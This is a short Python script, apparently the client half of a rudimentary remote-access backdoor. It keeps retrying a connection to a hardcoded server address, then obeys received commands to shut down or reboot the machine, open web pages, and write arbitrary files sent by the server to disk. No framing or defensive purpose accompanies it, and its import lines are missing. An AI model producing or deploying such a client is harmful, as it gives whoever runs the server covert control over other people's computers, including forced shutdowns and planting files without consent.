def connect_to_server():
    while True:
        try:
            s = socket.socket()
            host = "192.168.1.12"
            port = 8080
            s.connect((host, port))
            print("Connected to server")
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

s = connect_to_server()

while True:
    command = s.recv(1024).decode()
    
    if command == "shutdown":
        os.system("shutdown -s -t 00" if platform.system() == "Windows" else "shutdown now")
    elif command == "restart":
        os.system("shutdown -r -t 00" if platform.system() == "Windows" else "reboot")
    elif command == "DOS Attack":
        os.system("start msedge.exe https://www.example.com" if platform.system() == "Windows" else "xdg-open https://www.example.com")
    elif command == "Shantabhai":
        os.system("start msedge.exe https://www.youtube.com/watch?v=Uk65cmPGl8s" if platform.system() == "Windows" else "xdg-open https://www.youtube.com/watch?v=Uk65cmPGl8s")
    elif command == "file_transfer":
        file_info = s.recv(1024).decode()
        file_name, file_size = file_info.split("|")
        file_size = int(file_size)
        
        with open(file_name, "wb") as f:
            received_size = 0
            while received_size < file_size:
                data = s.recv(1024)
                if not data:
                    break
                f.write(data)
                received_size += len(data)
        print(f"File {file_name} received successfully.")
    elif command == "exit":
        s.close()
        break
    else:
        print("Unknown command received.")